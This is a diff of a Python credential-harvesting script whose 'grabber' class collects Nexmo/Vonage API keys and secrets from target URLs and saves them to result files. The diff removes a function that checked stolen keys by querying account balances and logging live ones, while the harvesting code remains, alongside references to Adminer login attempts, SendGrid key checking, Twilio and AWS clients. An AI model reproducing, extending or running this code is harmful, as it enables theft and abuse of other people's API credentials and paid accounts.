@@ -20,7 +20,7 @@ except:
     from Queue import Queue
 
 if sys.version_info.major == 3:
-    import vonage
+    #import vonage
     import boto3
     from twilio.rest import Client
 
@@ -1828,7 +1828,7 @@ class grabber:
                         return False
                     else:
                         satu = clean(urlku + '|' + str(key) + "|" + str(sec))
-                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
+                        
                         with open('Result/nexmo.txt', 'a') as ff:
                             ff.write(satu + '\n')
                         return True
@@ -1846,7 +1846,7 @@ class grabber:
                         return False
                     else:
                         satu = clean(urlku + '|' + str(key) + "|" + str(sec))
-                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
+                        
                         with open('Result/nexmo.txt', 'a') as ff:
                             ff.write(satu + '\n')
                         return True
@@ -1867,7 +1867,7 @@ class grabber:
                         return False
                     else:
                         satu = clean(urlku + '|' + str(key) + "|" + str(sec))
-                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
+                        
                         with open('Result/nexmo.txt', 'a') as ff:
                             ff.write(satu + '\n')
                         return True
@@ -1885,7 +1885,7 @@ class grabber:
                         return False
                     else:
                         satu = clean(urlku + '|' + str(key) + "|" + str(sec))
-                        login_nexmo(urlku, satu.split('|')[1], satu.split('|')[2])
+                        
                         with open('Result/nexmo.txt', 'a') as ff:
                             ff.write(satu + '\n')
                         return True
@@ -2874,17 +2874,6 @@ def adminer(target, user, pw):
                 pass
     except:
         return False
-
-
-def login_nexmo(f_url, f_key, f_secret):
-    try:
-        f_key = str(f_key)
-        f_secret = str(f_secret)
-        cl = vonage.Client(key=f_key, secret=f_secret)
-        res = cl.get_balance()
-        open('Result/nexmo_live.txt', 'a').write('-' * 30 + '\nURL = {}\nKEY = {}\nSECRET = {}\nVALUE = {}\nautoReload = {}\n'.format(f_url, f_key, f_secret,res['value'], res['autoReload']) + '\n')
-    except:
-        pass
 
 def ceker_sendgrid(f_url,f_key):
     try:
